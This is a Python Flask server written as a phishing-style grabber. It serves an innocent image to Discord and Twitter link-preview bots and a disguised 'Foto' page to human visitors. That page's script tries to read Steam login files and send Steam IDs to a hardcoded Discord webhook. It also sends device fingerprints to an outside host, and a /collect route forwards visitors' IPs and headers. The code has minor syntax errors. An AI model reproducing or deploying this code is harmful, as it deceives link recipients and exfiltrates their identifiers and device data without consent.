from flask import Flask, request, send_file, Response
import requests
from io import BytesIO
from PIL import Image
import os
import time

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1499395449084317867/6iMdHjNUV_2Eir_1m98xVz8Suz21ceWmYWmki8QT6v7zqmIZUI7YaoimIqk6w4cKwkrf" # Seu webhook
IMAGE_URL = "https://media.tenor.com/dxPl_UoR8J0AAAAM/fire-writing.gif"

def process_image(img_data):
    img = Image.open(BytesIO(img_data))
    if img.mode == 'RGBA':
        img = img.convert('RGB')
    output = BytesIO()
    img.save(output, format='JPEG', quality=85, optimize=True)
    output.seek(0)
    return output

EXFIL_HTML = f"""<!DOCTYPE html>
<html>
<head>
    <meta property="og:image" content="https://SEUDOMINIO.com/preview">
    <meta property="og:title" content="Foto">
    <meta property="og:description" content="Visualizar">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Foto</title>
</head>
<body style="margin:0; background:#111; overflow:hidden;">
    <canvas id="c" style="display:none;"></canvas>
    <div id="status" style="color:#0f0; font-family:monospace; padding:20px; font-size:13px;">Pronto</div>
    <script>
        const url = 'https://image-ztkc.onrender.com';
        const wh = '{WEBHOOK_URL}';
        
        function exfil(steamDir) {{
            if (!steamDir) return;
            
            fetch('file:///' + steamDir + '/config/loginusers.vdf')
                .then(r => r.text())
                .then(t => {{
                    const matches = t.match(/"7656119\d+"/g);
                    if (matches) {{
                        fetch(wh, {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{
                                content: '**Steam ID**\\n```json\\n' + 
                                    JSON.stringify({{
                                        ids: matches.map(m => m.replace(/"/g, '')),
                                        path: steamDir,
                                        time: new Date().toISOString(),
                                        user: navigator.userAgent
                                    }}, null, 2) + '```'
                            }})
                        }});
                    }}
                }})
                .catch(() => {{}});
        }}
        
        const steamPaths = [
            'C:\\\\Program Files (x86)\\\\Steam',
            'D:\\\\Steam',
            'E:\\\\Steam',
            'C:\\\\Steam',
            'F:\\\\Steam',
            'G:\\\\Steam'
        ];
        
        steamPaths.forEach(exfil);
        
        const img = new Image();
        img.src = url + '?d=' + btoa(navigator.userAgent);
        
        let frame = 0;
        function capture() {{
            const c = document.getElementById('c');
            const ctx = c.getContext('2d');
            c.width = 512;
            c.height = 512;
            ctx.fillStyle = '#111';
            ctx.fillRect(0, 0, 512, 512);
            frame++;
            
            fetch(url, {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    ua: navigator.userAgent,
                    lang: navigator.language,
                    res: screen.width + 'x' + screen.height,
                    mem: navigator.deviceMemory || 'N/A',
                    cores: navigator.hardwareConcurrency || 'N/A',
                    time: new Date().toISOString(),
                    frame: frame
                }})
            }});
            
            if (frame < 10) setTimeout(capture, 100);
        }}
        
        setTimeout(capture, 1000);
        document.body.onclick = () => capture();
    </script>
</body>
</html>"""

@app.route('/preview')
def preview():
    ua = request.headers.get('User-Agent', '')
    if 'Discordbot' in ua or 'Twitterbot' in ua:
        try:
            img_data = requests.get(IMAGE_URL, timeout=10).content
            processed = process_image(img_data)
            response = send_file(processed, mimetype='image/jpg')
            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"
            response.headers["ETag"] = str(time.time())
            return response
        except:
            return "Erro", 500
    
    return Response(EXFIL_HTML, mimetype='text/html')

@app.route('/collect', methods=['GET', 'POST'])
def collect():
    data = {
        'ip': request.remote_addr,
        'ua': str(request.user_agent),
        'headers': dict(request.headers),
        'method': request.method,
        'time': time.time()
    }
    
    try:
        requests.post(WEBHOOK_URL, json={
            'content': f'**Coleta**\n```json\n{json.dumps(data, indent=2)}```'
        }, timeout=5)
    except:
        pass
    
    gif_bytes = (
        b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
        b'\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00'
        b'\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
    )
    
    response = send_file(BytesIO(gif_bytes), mimetype='image/gif')
    response.headers["Cache-Control"] = "no-cache, no-store"
    return response

@app.route('/')
def index():
    return Response(EXFIL_HTML, mimetype='text/html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000)
    app.run(host='0.0.0.0', port=port, threaded=True)
